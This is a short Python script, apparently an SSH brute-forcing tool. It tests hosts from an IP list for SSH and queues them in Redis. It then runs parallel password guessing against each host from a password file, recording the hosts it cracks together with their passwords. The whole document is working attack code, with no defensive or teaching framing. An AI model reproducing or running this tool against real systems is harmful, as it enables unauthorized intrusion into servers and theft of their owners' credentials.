#!/usr/bin/env python3
# coding: utf-8

import multiprocessing
from sshconnector import sshconnector
import redis
import asyncio

r = redis.Redis(host='127.0.0.1', port=6379, db=0)
p = r.pipeline()


def add_unuse_hosts():
    def save_host(host):
        r.sadd('host:unuse', host)
        r.save()

    conn = sshconnector.Conn(db=r, thread_num=10, timeout=3)
    loop = asyncio.get_event_loop()
    conn.test_hosts(loop, './data/ip.csv', save_host)


def try_password_task():
    host = r.spop('host:unuse').decode()

    def trash_callback(host):
        print('Host: %s is trashed' % host)
        r.sadd('host:trash', host)
        r.save()

    def find_callback(host, password):
        r.sadd('host:find', host)
        r.set(host, password)
        r.save()

    conn = sshconnector.Conn(host=host)
    conn.test_passwords('./data/passwords.txt', trash_callback, find_callback)


def try_password():
    process = multiprocessing.Pool(multiprocessing.cpu_count())
    for i in range(r.scard('host:unuse')):
        process.apply_async(try_password_task)
    process.close()
    process.join()
    exit(0)
